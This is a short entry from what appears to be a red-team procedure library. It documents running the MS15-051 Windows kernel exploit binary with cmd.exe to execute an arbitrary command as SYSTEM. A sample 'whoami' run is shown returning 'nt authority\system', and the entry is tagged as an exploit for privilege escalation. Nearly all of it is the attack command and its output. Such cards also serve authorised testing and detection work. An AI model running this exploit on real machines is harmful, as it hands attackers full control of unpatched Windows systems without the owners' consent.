---
id: ff7eae46-654a-4251-983c-831f322fbd8d
type: command
executor: command_prompt
data: cmd.exe /c ms15-051.exe "$_COMMAND"
output: |-
  C:\>cmd.exe /c ms15-051.exe "whoami"
  [#] ms15-051 fixed by zcgonvh
  [!] process with pid: 1616 created.
  ==============================
  nt authority\system
created_at: '2019-12-05T23:29:37.824954+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - exploit
  - privilege-escalation
verified: true
validated: true
---

# Execute MS15-051 Exe Command Shell

## Command

```command_prompt
cmd.exe /c ms15-051.exe "$_COMMAND"
```

## Description

Runs the MS15-051 kernel exploit to execute a command as SYSTEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /c | Carry out command | Yes |
| ms15-051.exe | Exploit binary path | Yes |
| "$_COMMAND" | Command to run elevated | Yes |

## Examples

### Basic Usage

```command_prompt
cmd.exe /c ms15-051.exe "whoami"
```

## Expected Output

Exploit messages followed by elevated command output.

## Related

- [[procedures/exploit-clientcopyimage-vulnerability-ms15-051]]
